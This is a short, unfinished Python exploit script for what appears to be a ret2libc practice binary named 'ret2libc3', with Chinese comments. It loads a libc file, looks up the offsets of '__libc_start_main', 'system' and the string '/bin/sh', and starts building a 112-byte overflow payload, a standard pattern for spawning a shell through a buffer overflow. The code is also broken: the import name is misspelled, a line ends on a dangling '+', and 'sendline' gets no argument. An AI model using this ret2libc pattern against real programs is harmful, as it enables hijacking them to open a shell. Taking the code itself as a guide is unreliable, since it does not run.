from pwb import *

p = process("./ret2libc3")
libc = ELF("./libc.so")
#得到libc中所需要的函數的相對偏移
__libc_start_main = libc.symbols["__libc_start_main"]
system = libc.symbols["system"]
str_binsh = 0x0
for address in libc.search("/bin/sh\x00"):
	str_binsh = address
#得到內存中__libc_start_main的位置


payload1 = 'a'*112+
p.sendline()
